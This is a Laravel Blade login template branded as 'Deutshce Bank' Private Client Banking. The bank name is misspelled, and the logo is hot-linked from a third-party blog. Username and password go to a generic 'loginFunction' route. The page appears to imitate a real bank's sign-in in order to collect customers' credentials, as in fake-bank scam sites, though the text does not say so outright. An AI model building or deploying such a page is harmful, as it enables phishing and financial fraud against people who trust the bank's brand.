@extends('layouts.user')

@section('content')

    <div class="mt-7 login-section">
        <div class="tf-container">
            <form method="POST" action="{{ route('loginFunction') }}">
                @csrf
                <div class="text-center mb-5">
                    <img class="b-40 mb-3" src="{{asset('https://garethdavidstudio.com/blog/wp-content/uploads/2020/12/DEUTSCHE-BANK_22.jpg')}}" alt="" srcset="">
                <h1 class="color-brown-dark mb-0">Deutshce Bank</h1>
                <h3 class="color-brown-light font-200 mb-0">Private Client Banking</h3>
                </div>
                  
                    <div class="group-input">
                        <label>Username</label>
                        <input type="text" name="email" class="form-control rounded-xs" id="c1"
                        placeholder="Username" />
                    </div>
                    @error('email')
                    <span class="invalid-feedback" role="alert">
                        <strong>{{ $message }}</strong>
                    </span>
                @enderror
                    <div class="group-input auth-pass-input last">
                        <label>Password</label>
                        <input type="password" name="password" id="password" class="password-input" placeholder="Password">
                        <a class="icon-eye alert password-addon" id="password-addon"></a>
                    </div>
                    <a href="08_reset-password.html" class="auth-forgot-password mt-3">Forgot Password?</a>

                <button type="submit" class="tf-btn accent large">Log In</button>

            </form>
            </div>
    </div>

    <script>
        function togglePasswords() {
            var passwordInput = document.getElementById('password');
            var confirmationInput = document.getElementById('password_confirmation');
            var checkbox = document.querySelector('input[type="checkbox"]');

            if (checkbox.checked) {
                passwordInput.type = "text";
                confirmationInput.type = "text";
            } else {
                passwordInput.type = "password";
                confirmationInput.type = "password";
            }
        }
    </script>
@endsection
